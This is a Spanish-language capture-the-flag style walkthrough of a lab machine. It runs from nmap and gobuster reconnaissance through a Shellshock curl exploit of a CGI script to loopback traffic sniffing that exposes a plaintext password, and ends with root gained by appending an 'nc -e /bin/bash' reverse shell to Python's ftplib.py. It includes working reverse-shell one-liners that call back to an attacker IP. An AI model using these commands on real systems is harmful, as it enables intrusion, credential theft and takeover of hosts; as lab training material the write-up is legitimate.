1. Escaneo de puertos 
```
nmap -p- --open -n --min-rate 5000 -sCS -vvv -Pn -oN ports 192.168.115.136
```
Impresión 
```
Discovered open port 21/tcp on 192.168.115.136
Discovered open port 22/tcp on 192.168.115.136
Discovered open port 80/tcp on 192.168.115.136
```

2. Buscar directorios dentro de la URL
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.115.136/
```
Impresión
```
/cgi-bin/             (Status: 403) [Size: 280]
```
**Nota:** El directorio `/cgi-bin/` es especial destinado a alojar scripts de CGI (Common Gateway Interface). Estos scripts son programas que se ejecutan en el servidor web para generar contenido dinámico y procesar solicitudes del cliente.

3. Realizar nuevamente una búsqueda de directorios
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.115.136/cgi-bin
```
Impresión 
```
/underworld           (Status: 200) [Size: 62]
```

4. Buscar dentro URL
```
http://192.168.115.136/cgi-bin/underworld
```
Impresión 
```
16:45:35 up  1:06,  0 users,  load average: 0.05, 0.27, 0.95
```
**Nota:** Esta impresión hace alusión al comando `uptime` donde muestra la hora actual, el tiempo que lleva el equipo encendido, etc. 

**Nota:** Los scripts CGI, a menudo ubicados en el directorio `/cgi-bin/`, pueden invocar Bash para ejecutar comandos del sistema. Si un script CGI vulnerable pasa datos sin validación adecuada a Bash, un atacante podría explotar `Shellshock` para ejecutar omandos maliciosos en el servidor.

5. Buscando `Shellshock` en `exploit-db` encontré la siguiente
```
https://www.exploit-db.com/exploits/39887
```
Impresión 
```
VULNERABLE FILE
http://target.com//tarantella/cgi-bin/modules.cgi

POC :
localhost@~#curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://target.com/tarantella/cgi-bin/modules.cgi > xixixi.txt

localhost@~#cat xixixi.txt
which will print out the content of /etc/passwd file.
```
**Nota:** Haciendo un `curl` al fichero objetivo es posible descargar el archivo `/etc/passwd`

6. Del mismo modo habilitar una ReverShell
```
> nc -nlvp 443
> curl -A "() { :; }; /bin/sh -i >& /dev/tcp/192.168.115.162/443 0>&1 " http://192.168.115.136/cgi-bin/underworld
```

7. Ver Grupos 
```
gruops
```
Impresión
```
cerberus www-data pcap
```
**Nota:** El grupo `pcap` generalmente está asociado con el uso de herramientas de captura de paquetes de red, como `tcpdump`, `Wireshark`. Lo cual incluye la posibilidad de capturar paquetes que pueden contener información sensible como contraseñas, cookies de sesión y otros datos privados.

8.  Interceptar el trafico que hay dentro de la maquina (El trafico entre usuario dentro de la misma maquina) `lo` es la interfaz de red que viaja dentro de la maquina.
```
tcpdump -i lo -w captura.cap
```
**Nota:** Que no imprima data en pantalla, no significa que no esta interceptando data.

9. Analizar la data 
```
cat captura.cap
```
**Nota:** Ahí hay varias cadenas de caracteres parecidas a...
```
hades
PTpZTfU4vxgzvRBE
```

 10. No podemos hacer `sudo` pero dentro del `/opt` corre el `ftpcliente` que los privilegiados de este recurso son
```
drwxr-x--- 2 root hades 4096 Apr  6  2020 ftpclient
```
Usar las credenciales con un puerto abierto relacionado como el `ssh`
```
ssh hades@192.168.115.136
```

11. Dentro del `/opt/ftpclient` hay dos archivos `ftpclient.py` y `statuscheck.txt`
```python
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```
**Nota:** Está pasando una contraseña de texto claro a través de la red local

```bash
HTTP/1.1 200 OK
Date: Mon, 24 Jun 2024 03:45:01 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 20 Jul 2019 05:19:54 GMT
ETag: "f1-58e15fe4052c8"
Accept-Ranges: bytes
Content-Length: 241
Vary: Accept-Encoding
Content-Type: text/html
```
**Nota:** Se ejecuta por root con cron, por lo que si se inyecta un shell la próxima vez que se ejecute por root, el shell de root explota, pero ftpclient.py es de solo lectura pero importa la biblioteca ftplib.

12. Buscar la librería para Insertar una ReverShell a la librería
```
find / -iname '*ftplib*' 2>/dev/null
```
Impresión
```
/usr/lib/python2.7/ftplib.pyc
/usr/lib/python2.7/ftplib.py
/usr/lib/python3.5/__pycache__/ftplib.cpython-35.pyc
/usr/lib/python3.5/ftplib.py
```

13. Insertar ReverShell en `python` 
```python
echo 'os.system("nc -e /bin/bash 192.168.115.162 443")' >> /usr/lib/python2.7/ftplib.py
```
Colocarse en escucha en el `443`
